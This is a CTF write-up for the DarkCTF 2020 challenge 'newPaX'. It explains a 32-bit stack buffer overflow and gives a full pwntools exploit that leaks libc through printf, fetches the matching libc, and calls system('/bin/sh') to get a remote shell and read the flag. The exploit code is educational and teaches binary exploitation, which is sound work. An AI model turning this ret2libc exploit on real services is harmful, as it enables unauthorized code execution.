# DarkCTF 2020

## pwn/newPaX

> 95 solves / 411 points
>
> Author: gr4n173
>
> Even though Solar Designer gave you his times technique, you have to resolve(sort-out) yourself and go deeper. This time rope willn't let you have anything you want but you have to make a fake rope and get everything.
>
> `nc pwn.darkarmy.xyz 5001`
>  
> [newPaX](newPaX)

Tags: _pwn_ _x86_ _remote-shell_ _rop_ _bof_


## Summary

`read` buffer overflow with no stack protection.

> This is virtually the same as [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what), _except it's 32-bits_.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No shellcode, but that's about it.


### Decompile with Ghidra


```c
void vuln(void)
{
  undefined local_34 [44];
  
  __x86.get_pc_thunk.ax();
  read(0,local_34,200);
  return;
}
```

`read` bof vulnerability (reading 200 bytes into a 44-byte buffer that is `0x34` (52) bytes from the return address in the stack).  Easy ROP since no canary or PIE.  To get to the return address send `0x34` bytes (gotta love how Ghidra tells you that, i.e. `local_34`).


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./newPaX')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    libc_index = 5
    p = remote('newpax.darkarmy.xyz', 5001)
```

Boilerplate pwntools.  Notice there's no `libc` set for `REMOTE` since we have to find it first (see `libc_index` below).


### Leak libc

```python
payload  = 0x34 * b'A'
payload += p32(binary.plt.printf)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.printf)

p.send(payload)
_ = p.recv(4)
printf = u32(_)
log.info('printf: ' + hex(printf))
p.recv(20)
```

Standard `printf` _printing_ itself.  With the `printf` location known we can find the version and base address of libc.  The last part of the payload jumps back to `vuln` for a second and final pass.

> While nearly identical to [roprop](https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop), less got this, perhaps 32-bit is a mystery.
> 
> x86 32-bit systems pass params via the stack, no need for ROP gadgets like `pop rdi`.  The params are return address, then params to the function.  Above we're calling `printf` to leak itself, then setting the return address to `vuln` for a 2nd pass, then finally the first argument to `printf`--it's own address (the leak).  Sometimes you have to worry about `EBX`, but that's a [story](https://github.com/datajerk/ctf-write-ups/tree/master/auctf2020/house-of-madness#but-wait--theres-more) for another time.


### Find libc

```python
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'printf':hex(printf)[-3:]}})
        libc_url = r.json()[libc_index]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)

libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))
```

> Something new I'm experimenting with.

The `if` block will detect and download the correct libc. `libc_url = r.json()[libc_index]['download_url']` needs to be changed if the downloaded libc does not work, just increment `libc_index` (see above) until you get the right one (`5` in this case).


### Get a shell, get the flag

```python
payload  = 0x34 * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.send(payload)
p.interactive()
```

Pop a shell, get the flag.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/darkctf2020/newpax/newPaX'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to newpax.darkarmy.xyz on port 5001: Done
[*] printf: 0xf7d67bd0
[*] getting: https://libc.rip/download/libc6-i386_2.27-3ubuntu1.2_amd64.so
[*] '/pwd/datajerk/darkctf2020/newpax/libc6-i386_2.27-3ubuntu1.2_amd64.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0xf7d17000
[*] Switching to interactive mode
$ ls -l
total 32
drwxr-x--- 1 0 1000 4096 Sep 25 01:59 bin
drwxr-x--- 1 0 1000 4096 Sep 25 01:58 dev
-rwxr----- 1 0 1000   49 Sep 21 17:58 flag.txt
drwxr-x--- 1 0 1000 4096 Sep 25 01:58 lib
drwxr-x--- 1 0 1000 4096 Sep 25 01:58 lib32
drwxr-x--- 1 0 1000 4096 Sep 25 01:58 lib64
-rwxr-x--- 1 0 1000 7568 Sep 19 11:14 newPaX
$ cat flag.txt
darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
```

> _Is the flag hinting at a [ret2dlresolve](https://docs.pwntools.com/en/beta/rop/ret2dlresolve.html) solution?_  Not what I used here.
